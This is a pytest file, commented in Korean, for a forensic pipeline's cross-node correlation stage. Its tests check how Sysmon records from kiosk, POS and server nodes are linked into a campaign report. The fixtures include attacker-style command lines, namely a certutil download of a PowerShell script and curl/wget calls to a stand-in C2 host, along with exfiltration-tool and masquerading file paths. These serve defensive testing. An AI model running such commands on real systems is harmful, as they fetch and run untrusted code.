"""08단계 — 노드 간 상관분석 테스트.

이 단계의 가장 중요한 성질 둘이다.

- **기각된 소견의 레코드로 노드를 잇지 않는다.** 이으면 캠페인 보고서가
  06단계 검증을 우회하는 뒷문이 된다.
- **빠진 노드를 조용히 지나가지 않는다.** 두 노드짜리 캠페인이 말없이
  나오면 읽는 사람은 "그 단말에는 흔적이 없었다"로 읽는다.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from src.common import io, schema
from src.stage08_campaign import campaign
from src.stage05_interpret import coverage as coverage_mod

HASH = "b" * 64
FIXTURE = Path(__file__).resolve().parents[1] / "benchmark/fixtures/campaign-3node"


def record(ref, artifact="evtx:Sysmon", at=None, **fields):
    doc = {"ref": ref, "artifact": artifact, "fields": fields}
    if at:
        doc["timestamp"] = at
    return doc


def node(name, records, verdicts, *, status="ok", **extra):
    return {
        "node": name,
        "case_id": f"C-{name}",
        "status": status,
        "records": len(records),
        "_records": records,
        "_verdicts": verdicts,
        **extra,
    }


def build(*nodes):
    return campaign.build({"campaign_id": "T1"}, list(nodes))


# ======================================================== 노드를 잇는 조건


def test_a_value_seen_on_only_one_node_makes_no_link():
    """한 노드 안의 값은 노드를 잇지 않는다."""
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", Hashes=f"SHA256={HASH}")], {"SYSMON#1": "passed"}),
        node("pos", [record("SYSMON#2", at="2026-09-10T02:00:00Z", Hashes="SHA256=" + "c" * 64)], {"SYSMON#2": "passed"}),
    )
    assert document["links"] == []
    assert document["stats"]["links"] == 0


def test_repetition_inside_one_node_does_not_inflate_the_link():
    """같은 값이 한 노드에서 여러 번 나와도 링크는 하나, 관측도 노드당 하나다."""
    kiosk = [
        record("SYSMON#1", at="2026-09-10T01:00:00Z", Hashes=f"SHA256={HASH}"),
        record("SYSMON#2", at="2026-09-10T01:00:30Z", Hashes=f"SHA256={HASH}"),
        record("SYSMON#3", at="2026-09-10T01:01:00Z", Hashes=f"SHA256={HASH}"),
    ]
    document = build(
        node("kiosk", kiosk, {r["ref"]: "passed" for r in kiosk}),
        node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", Hashes=f"SHA256={HASH}")], {"SYSMON#9": "passed"}),
    )
    assert len(document["links"]) == 1
    observations = document["links"][0]["observations"]
    assert len(observations) == 2
    # 가장 이른 것을 남긴다 — 그 노드에서 처음 나타난 시각이라야 순서가 뜻을 갖는다.
    assert observations[0]["ref"] == "SYSMON#1"


def test_a_value_on_every_node_is_counted_as_background_not_linked():
    """모든 노드에 있는 값은 대개 배경이다. 내리되 개수는 남긴다."""
    records = {
        name: [record(f"SYSMON#{i}", at=f"2026-09-10T0{i}:00:00Z", Hashes=f"SHA256={HASH}")]
        for i, name in enumerate(("kiosk", "pos", "server"), start=1)
    }
    document = build(*(node(name, recs, {recs[0]["ref"]: "passed"}) for name, recs in records.items()))
    assert document["links"] == []
    assert document["stats"]["ubiquitous_values"] == 1


# ================================================ 신호등을 우회하지 않는가


def test_a_rejected_finding_can_never_create_a_link():
    """기각된 소견만 인용한 레코드로는 노드를 잇지 않는다.

    이으면 06단계가 버린 문장이 캠페인 보고서에서 되살아난다.
    """
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", Hashes=f"SHA256={HASH}")], {"SYSMON#1": "rejected"}),
        node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", Hashes=f"SHA256={HASH}")], {"SYSMON#9": "passed"}),
    )
    assert document["links"] == []
    assert document["context_links"] == []


def test_one_warning_end_downgrades_the_whole_link():
    """양끝 등급 중 낮은 쪽이 링크의 등급이다."""
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", Hashes=f"SHA256={HASH}")], {"SYSMON#1": "passed"}),
        node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", Hashes=f"SHA256={HASH}")], {"SYSMON#9": "warning"}),
    )
    assert [link["grade"] for link in document["links"]] == ["warning"]
    assert document["stats"]["links_warning"] == 1


def test_a_link_no_finding_cited_goes_to_context_not_the_chain():
    """05단계가 고르지 않은 레코드는 검증을 거치지 않았다. 본문 체인에 넣지 않는다."""
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", Hashes=f"SHA256={HASH}")], {}),
        node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", Hashes=f"SHA256={HASH}")], {}),
    )
    assert document["links"] == []
    assert len(document["context_links"]) == 1
    assert document["stats"]["context_links"] == 1


# ============================================================== 상관 축


def test_an_uncited_record_cannot_hide_a_cited_one():
    """노드 대표는 이른 순이 아니라 **판정이 좋은 순**으로 고른다.

    합성 픽스처 ``campaign-3node`` 에서 실제로 물린 자리다. pos 쪽에 인용된
    레코드(13:46:05)보다 25초 이른 **인용되지 않은** 레코드(13:45:40)가 같은
    파일명을 갖고 있었고, 이른 쪽이 대표가 되는 바람에 링크 전체가 참고
    항목으로 내려갔다. 검증된 근거가 검증 안 된 것 뒤에 가리면 안 된다.
    """
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", Image="C:/Temp/s.ps1")], {"SYSMON#1": "passed"}),
        node(
            "pos",
            [
                record("MFT#5", artifact="$MFT", at="2026-09-10T02:00:00Z", Path="D:/tools/s.ps1"),
                record("SYSMON#9", at="2026-09-10T02:00:25Z", Image="D:/tools/s.ps1"),
            ],
            {"SYSMON#9": "passed"},
        ),
    )
    assert document["context_links"] == []
    assert [link["grade"] for link in document["links"]] == ["passed"]
    assert [item["ref"] for item in document["links"][0]["observations"]] == ["SYSMON#1", "SYSMON#9"]




def test_a_different_drive_still_links_by_filename():
    """노드마다 드라이브나 폴더가 달라도 파일명은 이어진다.

    전체 경로만 보면 같은 파일이 옮겨 간 것을 놓친다.
    """
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", Image="C:/Windows/Temp/s.ps1")], {"SYSMON#1": "passed"}),
        node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", Image="D:/tools/s.ps1")], {"SYSMON#9": "passed"}),
    )
    axes = {link["axis"] for link in document["links"]}
    assert "filename" in axes
    assert "path" not in axes  # 경로는 실제로 다르다


def test_the_network_axis_reads_both_the_field_and_the_command_line():
    """Sysmon EID 3 이 없는 쪽은 명령행에 박힌 주소로 이어진다."""
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", CommandLine="certutil -f http://192.168.0.153:8000/s.ps1")], {"SYSMON#1": "passed"}),
        node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", DestinationIp="192.168.0.153")], {"SYSMON#9": "passed"}),
    )
    assert [(link["axis"], link["value"]) for link in document["links"]] == [("network", "192.168.0.153")]


def test_the_network_axis_extracts_domain_hosts_from_command_line_urls():
    """명령행 URL은 경로·포트가 달라도 같은 도메인 호스트로 이어진다."""
    document = build(
        node(
            "kiosk",
            [record("SYSMON#1", at="2026-09-10T01:00:00Z", CommandLine="curl https://C2.Example.Test:8443/a")],
            {"SYSMON#1": "passed"},
        ),
        node(
            "pos",
            [record("SYSMON#9", at="2026-09-10T02:00:00Z", CommandLine="wget http://c2.example.test/b")],
            {"SYSMON#9": "passed"},
        ),
    )
    assert [(link["axis"], link["value"]) for link in document["links"]] == [
        ("network", "c2.example.test")
    ]


@pytest.mark.parametrize(
    "url",
    [
        "http://localhost:8000/a",
        "https://localhost.localdomain/b",
        "http://127.23.45.67/c",
        "http://[::1]/d",
    ],
)
def test_command_line_loopback_urls_do_not_link_nodes(url):
    """URL에서 뽑은 로컬 호스트와 루프백 주소는 노드 사이를 잇지 않는다."""
    document = build(
        node(
            "kiosk",
            [record("SYSMON#1", at="2026-09-10T01:00:00Z", CommandLine=f"curl {url}")],
            {"SYSMON#1": "passed"},
        ),
        node(
            "pos",
            [record("SYSMON#9", at="2026-09-10T02:00:00Z", CommandLine=f"wget {url}")],
            {"SYSMON#9": "passed"},
        ),
    )
    assert document["links"] == []


@pytest.mark.parametrize("account", ["SYSTEM", "DOM\\SYSTEM", "KIOSK01$", "Local Service"])
def test_builtin_accounts_never_link_nodes(account):
    """어느 윈도우 기계에나 있는 계정으로 이으면 모든 노드가 이어진다."""
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", User=account)], {"SYSMON#1": "passed"}),
        node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", User=account)], {"SYSMON#9": "passed"}),
    )
    assert document["links"] == []


def test_loopback_is_not_a_link():
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", DestinationIp="127.0.0.1")], {"SYSMON#1": "passed"}),
        node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", DestinationIp="127.0.0.1")], {"SYSMON#9": "passed"}),
    )
    assert document["links"] == []


# ========================================================= 빠진 노드


def test_a_missing_node_is_reported_not_skipped_silently():
    """노드가 빠져도 멈추지 않되, 왜 빠졌는지 결과와 보고서에 남는다."""
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", Hashes=f"SHA256={HASH}")], {"SYSMON#1": "passed"}),
        node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", Hashes=f"SHA256={HASH}")], {"SYSMON#9": "passed"}),
        node("server", [], {}, status="missing", reason="케이스 디렉터리가 없습니다"),
    )
    assert document["stats"]["nodes_total"] == 3
    assert document["stats"]["nodes_ok"] == 2

    text = campaign.render(campaign.build_context(document))
    assert "server" in text
    assert "케이스 디렉터리가 없습니다" in text
    assert "보지 못한 것입니다" in text


@pytest.mark.parametrize(
    "broken_name",
    ["05_findings.json", "06_verified.json", "02_scenario.json"],
)
def test_a_malformed_node_json_is_reported_as_incomplete(tmp_path, broken_name):
    """한 노드의 JSON이 깨져도 예외를 전파하지 않고 그 노드만 제외한다."""
    case = tmp_path / "C-broken"
    (case / "04_parsed").mkdir(parents=True)
    io.write_json(case / "05_findings.json", {"findings": []})
    io.write_json(
        case / "06_verified.json",
        {"passed": [], "rejected": [], "unverifiable": []},
    )
    io.write_json(case / "02_scenario.json", {"entities": {"hosts": ["BROKEN01"]}})
    (case / broken_name).write_text("{broken", encoding="utf-8")

    result = campaign.read_node(
        {"node": "broken", "case_id": "C-broken"},
        tmp_path,
    )

    assert result["status"] == "incomplete"
    assert broken_name in result["reason"]
    assert "JSON 파싱 실패" in result["reason"]

    document = build(node("healthy", [], {}), result)
    assert document["stats"]["nodes_total"] == 2
    assert document["stats"]["nodes_ok"] == 1
    assert result["reason"] in campaign.render(campaign.build_context(document))


@pytest.mark.parametrize("broken_name", ["05_findings.json", "06_verified.json"])
@pytest.mark.parametrize("root", [[], "not-an-object", None])
def test_a_non_object_node_json_is_reported_as_incomplete(tmp_path, broken_name, root):
    """JSON 문법이 맞아도 최상위 값이 객체가 아니면 해당 노드만 제외한다."""
    case = tmp_path / "C-broken"
    (case / "04_parsed").mkdir(parents=True)
    io.write_json(case / "05_findings.json", {"findings": []})
    io.write_json(
        case / "06_verified.json",
        {"passed": [], "rejected": [], "unverifiable": []},
    )
    (case / broken_name).write_text(json.dumps(root), encoding="utf-8")

    result = campaign.read_node(
        {"node": "broken", "case_id": "C-broken"},
        tmp_path,
    )

    assert result["status"] == "incomplete"
    assert broken_name in result["reason"]
    assert "JSON 객체가 아닙니다" in result["reason"]


def test_no_links_reads_differently_when_there_is_nothing_to_compare():
    """'연결이 없다'와 '비교할 상대가 없다'는 다른 사실이다."""
    alone = campaign.render(
        campaign.build_context(build(node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z")], {})))
    )
    assert "비교할 상대가 없습니다" in alone

    pair = campaign.render(
        campaign.build_context(
            build(
                node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", Image="C:/a.exe")], {"SYSMON#1": "passed"}),
                node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", Image="C:/b.exe")], {"SYSMON#9": "passed"}),
            )
        )
    )
    assert "공유된 값을 찾지 못했습니다" in pair


def test_mermaid_omits_an_edge_when_an_observation_has_no_time():
    """시각이 없는 관측을 뒤쪽 노드로 간주해 방향을 지어내지 않는다."""
    document = build(
        node(
            "timed",
            [record("SYSMON#1", at="2026-09-10T01:00:00Z", Hashes=f"SHA256={HASH}")],
            {"SYSMON#1": "passed"},
        ),
        node(
            "unknown",
            [record("SYSMON#9", Hashes=f"SHA256={HASH}")],
            {"SYSMON#9": "passed"},
        ),
    )

    assert len(document["links"]) == 1
    assert campaign._mermaid(document["links"]) == ["graph LR"]

    document["links"][0]["observations"][1]["at"] = "2026-09-10T02:00:00Z"
    assert campaign._mermaid(document["links"]) == [
        "graph LR",
        "  timed[timed] -->|해시| unknown[unknown]",
    ]


# ============================================================ 문서와 CLI


def test_the_document_matches_the_schema():
    document = build(
        node("kiosk", [record("SYSMON#1", at="2026-09-10T01:00:00Z", Hashes=f"SHA256={HASH}")], {"SYSMON#1": "passed"}),
        node("pos", [record("SYSMON#9", at="2026-09-10T02:00:00Z", Hashes=f"SHA256={HASH}")], {"SYSMON#9": "warning"}),
    )
    schema.validate(document, "campaign")
    schema.validate_stage(document)


def test_campaign_report_renders_per_node_coverage_without_changing_campaign_schema():
    scenario = io.new_document(
        "C-kiosk",
        "02_normalize",
        "test",
        target_os="windows_10",
        techniques=[],
        time_range={
            "start": "2026-09-07T13:00:00Z",
            "end": "2026-09-08T01:30:00Z",
            "basis": "테스트",
        },
        entities={"hosts": [], "accounts": [], "processes": [], "paths": [], "ips": []},
        overall_confidence=0.5,
        unmapped_text=[],
    )
    findings = io.new_document(
        "C-kiosk", "05_interpret", "test", input_refs=[], findings=[], timeline=[]
    )
    ledger = coverage_mod.build(scenario, findings, raw="키오스크 USB 침입")
    document = build(node("kiosk", [], {}), node("pos", [], {}))

    context = campaign.build_context(document, coverage_by_node={"kiosk": ledger})
    text = campaign.render(context)

    schema.validate(document, "campaign")
    assert len(context["coverage"]) == 10
    assert "## 노드별 조사 커버리지 매트릭스" in text
    assert "원장 없음" in text


def test_a_duplicate_node_name_is_refused(tmp_path):
    """이름이 겹치면 관측이 어느 노드 것인지 알 수 없다.

    ``ref`` 가 노드 안에서만 유일한 것과 같은 이유로 입구에서 막는다.
    """
    path = tmp_path / "campaign.json"
    path.write_text(
        json.dumps(
            {
                "campaign_id": "T1",
                "nodes": [
                    {"node": "kiosk", "case_id": "C-a"},
                    {"node": "kiosk", "case_id": "C-b"},
                ],
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(campaign.CampaignError, match="겹칩니다"):
        campaign.load_campaign(path)


@pytest.mark.parametrize(
    "document,message",
    [
        ({"nodes": [{"node": "a", "case_id": "C"}]}, "campaign_id"),
        ({"campaign_id": "T1", "nodes": []}, "nodes"),
        ({"campaign_id": "T1", "nodes": [{"node": "a"}]}, "case_id"),
    ],
)
def test_a_broken_campaign_file_says_what_to_fix(tmp_path, document, message):
    """사람이 쓰는 입력이라 스키마 위반 문구보다 고칠 것을 말해 준다."""
    path = tmp_path / "campaign.json"
    path.write_text(json.dumps(document), encoding="utf-8")
    with pytest.raises(campaign.CampaignError, match=message):
        campaign.load_campaign(path)


def test_the_cli_writes_both_outputs_and_names_the_missing_node(tmp_path):
    """관통 — campaign.json 하나로 08 산출물 둘이 나온다."""
    cases = tmp_path / "cases"
    for name, ref, at in (("C-kiosk", "SYSMON#1", "2026-09-10T01:00:00Z"), ("C-pos", "SYSMON#9", "2026-09-10T02:00:00Z")):
        case = cases / name
        (case / "04_parsed").mkdir(parents=True)
        io.write_jsonl(
            case / "04_parsed" / "sysmon.jsonl",
            [{**record(ref, at=at, Hashes=f"SHA256={HASH}"), "record_num": 1, "offset": "0x0", "flags": []}],
        )
        io.write_json(
            case / "05_findings.json",
            {"case_id": name, "findings": [{"id": "F1", "refs": [ref]}]},
        )
        io.write_json(
            case / "06_verified.json",
            {"case_id": name, "passed": [{"id": "F1"}], "rejected": [], "unverifiable": []},
        )

    campaign_path = tmp_path / "campaign.json"
    campaign_path.write_text(
        json.dumps(
            {
                "campaign_id": "T1",
                "nodes": [
                    {"node": "kiosk", "case_id": "C-kiosk"},
                    {"node": "pos", "case_id": "C-pos"},
                    {"node": "server", "case_id": "C-server"},
                ],
            },
            ensure_ascii=False,
        ),
        encoding="utf-8",
    )

    out = tmp_path / "out"
    assert campaign.main(["--in", str(campaign_path), "--cases", str(cases), "--out", str(out)]) == 0

    document = io.read_json(out / "08_campaign.json")
    schema.validate(document, "campaign")
    assert document["stats"]["links"] == 1
    assert document["stats"]["nodes_ok"] == 2

    text = (out / "08_campaign.md").read_text(encoding="utf-8")
    assert "kiosk" in text and "server" in text


def test_the_three_node_fixture_recovers_the_whole_chain(tmp_path):
    """합성 픽스처 관통 — 설계서 7장 6번.

    **실물이 아니다.** POS·관리서버 증거가 없어 배선을 세우고 지키는
    용도이며, 수치에 쓰면 안 된다(픽스처 README).

    이 하나가 08단계의 성질을 한꺼번에 잰다 — 세 노드를 관통하는 체인,
    빠진 노드의 사유, 기각된 소견이 링크를 만들지 못하는 것.
    """
    out = tmp_path / "camp"
    assert (
        campaign.main(
            [
                "--in", str(FIXTURE / "campaign.json"),
                "--cases", str(FIXTURE / "cases"),
                "--out", str(out),
            ]
        )
        == 0
    )

    document = io.read_json(out / "08_campaign.json")
    schema.validate(document, "campaign")

    assert document["stats"]["nodes_total"] == 4
    assert document["stats"]["nodes_ok"] == 3

    # 키오스크 → POS → 관리서버 로 이어진다
    hops = {tuple(item["node"] for item in link["observations"]) for link in document["links"]}
    assert ("kiosk", "pos") in hops
    assert ("pos", "server") in hops

    axes = {link["axis"] for link in document["links"]}
    assert axes == {"network", "hash", "filename", "account"}

    # 기각된 소견만 인용한 SYSMON#915 로는 어떤 링크도 서지 않는다
    cited = {
        item["ref"]
        for link in document["links"] + document["context_links"]
        for item in link["observations"]
    }
    assert "SYSMON#915" not in cited

    # 빠진 노드는 사유와 함께 보고서에 실린다
    text = (out / "08_campaign.md").read_text(encoding="utf-8")
    assert "backup" in text
    assert "보지 못한 것입니다" in text


def test_two_nodes_that_pick_the_same_host_name_get_none(tmp_path):
    """같은 이름을 두 노드가 집으면 그 이름은 어느 쪽도 특정하지 못한다.

    한 사건을 **한 질문으로** 조사하면 노드마다 시나리오가 같아져
    `entities.hosts[0]` 이 셋 다 같아진다. 그때 표에 그 이름을 적으면
    POS 를 키오스크라고 부르게 된다 (`K2L-20260908` 실측).
    """
    nodes = [
        {"node": "kiosk", "case_id": "A", "status": "ok", "host": "키오스크"},
        {"node": "pos", "case_id": "B", "status": "ok", "host": "키오스크"},
        {"node": "mgmt", "case_id": "C", "status": "ok", "host": "관리서버"},
    ]
    campaign.drop_ambiguous_hosts(nodes)

    assert "host" not in nodes[0]
    assert "host" not in nodes[1]
    # 혼자 집은 이름은 남는다 — 노드마다 다른 신고문을 받은 실행이 그렇다.
    assert nodes[2]["host"] == "관리서버"


# ============ OS 자리의 값은 노드를 잇지 않는다 — K2L2 가 드러낸 자리 (2026-09-10)


def test_a_windows_binary_does_not_link_two_nodes():
    """두 기계가 같은 윈도우를 깔았다는 말이지 파일이 옮겨졌다는 말이 아니다.

    실측(`K2L2-20260908`): 체인에 오른 🟢 5건이 전부
    `c:/windows/system32/schtasks.exe`·`.../whoami.exe` 였다. 앞선
    실행에서는 같은 자리에 `dismhost.exe` 가 있었다.
    """
    from src.stage08_campaign import correlate

    def node(name, ref):
        return correlate.observations_of(
            name,
            [{
                "ref": ref, "artifact": "evtx:Sysmon", "event_id": 1,
                "timestamp": "2026-09-07T13:38:59Z",
                "canonical": {"subject_path": r"C:\Windows\System32\schtasks.exe"},
            }],
            {ref: "passed"},
        )

    result = correlate.build_links(
        {"kiosk": node("kiosk", "SYSMON#1"), "mgmt": node("mgmt", "SYSMON#2")}, 2
    )
    assert result["links"] == []
    assert result["os_background_values"] > 0
    # 지우지 않는다 — 참고 표에 남아야 무엇을 왜 뺐는지 되짚을 수 있다.
    assert result["context_links"]


def test_a_file_outside_the_os_directories_still_links():
    """공격자가 옮긴 파일은 그대로 이어져야 한다."""
    from src.stage08_campaign import correlate

    def node(name, ref):
        return correlate.observations_of(
            name,
            [{
                "ref": ref, "artifact": "evtx:Sysmon", "event_id": 1,
                "timestamp": "2026-09-08T07:46:38Z",
                "canonical": {"subject_path": r"C:\exfil\tool.exe"},
            }],
            {ref: "passed"},
        )

    result = correlate.build_links(
        {"kiosk": node("kiosk", "SYSMON#1"), "mgmt": node("mgmt", "SYSMON#2")}, 2
    )
    assert [link["axis"] for link in result["links"]] == ["filename", "path"]
    assert result["os_background_values"] == 0


def test_an_unreadable_path_is_not_treated_as_background():
    """모르는 것을 배경으로 내리면 증거가 조용히 사라진다."""
    from src.stage08_campaign.correlate import _os_owned

    assert _os_owned("c:/windows/system32/cmd.exe")
    assert _os_owned("d:/program files/app/a.exe")
    assert not _os_owned("c:/exfil/rclone.exe")
    assert not _os_owned("//server/share/tool.exe")
    assert not _os_owned("tool.exe")
    assert not _os_owned("")


def test_a_planted_file_inside_system32_is_a_known_blind_spot():
    r"""**이 필터가 만드는 사각지대를 못 박아 둔다.**

    공격자가 `C:\Windows\System32\` 안에 파일을 놓으면(T1036.005) 그
    해시가 두 노드에서 같아도 이 필터가 배경으로 내린다. 베이스라인이
    없어서 "이 자리에 원래 있던 파일인가"를 물을 수 없기 때문이다
    (docs/limitations.md). 이 시험이 깨졌다면 그 사각지대가 닫힌 것이므로
    한계 문서도 함께 고친다.
    """
    from src.stage08_campaign import correlate

    def node(name, ref):
        return correlate.observations_of(
            name,
            [{
                "ref": ref, "artifact": "evtx:Sysmon", "event_id": 1,
                "timestamp": "2026-09-08T07:46:38Z",
                "canonical": {"subject_path": r"C:\Windows\System32\svch0st.exe"},
            }],
            {ref: "passed"},
        )

    result = correlate.build_links(
        {"kiosk": node("kiosk", "SYSMON#1"), "mgmt": node("mgmt", "SYSMON#2")}, 2
    )
    assert result["links"] == [], "사각지대가 닫혔다면 docs/limitations.md 도 고친다"


def test_the_context_table_is_capped_but_the_document_is_not():
    """**문서가 아니라 표를 자른다.**

    실측(`K2L-20260908`): 참고 연결 44,471건이 그대로 실려 보고서가
    44,538줄이었다. 본문은 55줄이다.
    """
    document = {
        "case_id": "C", "generated_at": "2026-09-10T00:00:00Z",
        "nodes": [], "links": [],
        "stats": {"nodes_ok": 2, "nodes_total": 2, "links": 0, "links_passed": 0,
                  "links_warning": 0, "links_observed": 0, "context_links": 0,
                  "ubiquitous_values": 0},
        "context_links": [
            {
                "axis": "path", "value": f"c:/x/{index}.exe",
                "observations": [
                    {"node": "a", "ref": f"MFT#{index}", "at": "2026-09-08T00:00:00Z"},
                    {"node": "b", "ref": f"MFT#{index+1}", "at": "2026-09-08T00:00:01Z"},
                ],
            }
            for index in range(campaign.MAX_CONTEXT_ROWS * 3)
        ],
    }
    context = campaign.build_context(document)

    assert context["context_shown"] == campaign.MAX_CONTEXT_ROWS
    assert context["context_total"] == campaign.MAX_CONTEXT_ROWS * 3
    assert len(context["context_links"]) == campaign.MAX_CONTEXT_ROWS
    # 문서는 그대로다 — 자른 것은 표뿐이다.
    assert len(document["context_links"]) == campaign.MAX_CONTEXT_ROWS * 3

    rendered = campaign.render(context)
    assert f"{campaign.MAX_CONTEXT_ROWS * 3}건 중 {campaign.MAX_CONTEXT_ROWS}건만" in rendered


def test_the_context_table_prefers_the_axes_that_are_harder_to_fake():
    """시간순으로 앞에서 자르면 가장 오래된 배경 잡음이 실린다."""
    def link(axis, at):
        return {
            "axis": axis, "value": f"{axis}-{at}",
            "observations": [{"node": "a", "ref": "MFT#1", "at": at},
                             {"node": "b", "ref": "MFT#2", "at": at}],
        }

    document = {
        "case_id": "C", "generated_at": "2026-09-10T00:00:00Z",
        "nodes": [], "links": [], "stats": {},
        # 경로 축이 먼저이고 더 이르지만, 해시가 밀려나면 안 된다.
        "context_links": (
            [link("path", f"2026-01-0{i}T00:00:00Z") for i in range(1, 6)]
            + [link("hash", "2026-09-08T00:00:00Z")]
        ),
    }
    context = campaign.build_context({**document, "context_links": list(document["context_links"])})
    campaign.MAX_CONTEXT_ROWS  # 상한보다 적으므로 전부 실린다

    # 상한을 1로 좁혀 무엇이 살아남는지 본다.
    import unittest.mock
    with unittest.mock.patch.object(campaign, "MAX_CONTEXT_ROWS", 1):
        narrowed = campaign.build_context(document)
    assert [item["axis"] for item in narrowed["context_links"]] == ["hash"]
